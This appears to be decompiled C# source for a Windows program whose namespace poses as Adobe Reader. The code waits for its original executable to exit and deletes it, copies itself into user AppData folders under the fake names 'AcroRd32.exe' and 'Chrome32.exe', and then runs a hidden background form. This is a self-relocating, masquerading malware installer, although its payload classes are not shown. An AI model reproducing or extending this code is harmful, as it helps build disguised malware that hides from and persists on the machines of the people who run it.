using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Adobe_Reader
{
	internal static class Program
	{
		[STAThread]
		private static void Main(string[] args)
		{
			try
			{
				if (args.Length != 0)
				{
					args[0] = args[0].Replace("?", " ");
					if (Path.IsPathRooted(args[0]) && File.Exists(args[0]))
					{
						int num = 0;
						bool flag;
						do
						{
							string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(args[0]);
							string exeFolderPath = Directory.GetParent(args[0]).ToString();
							flag = (Process.GetProcessesByName(fileNameWithoutExtension).FirstOrDefault((Process p) => p.MainModule.FileName.StartsWith(exeFolderPath)) != null);
							Thread.Sleep(100);
							num++;
						}
						while (flag && num < 100);
						if (!flag)
						{
							File.Delete(args[0]);
						}
					}
				}
				if (Tools.ExeSmartCopy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Adobe (x86)\\AcroRd32.exe"), true, true, false))
				{
					Tools.ExeSmartCopy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google (x86)\\Chrome32.exe"), true, false, true);
				}
			}
			catch (Exception)
			{
				Environment.Exit(0);
			}
			try
			{
				new BackgroundForm();
				Application.Run();
			}
			catch (Exception)
			{
			}
		}
	}
}
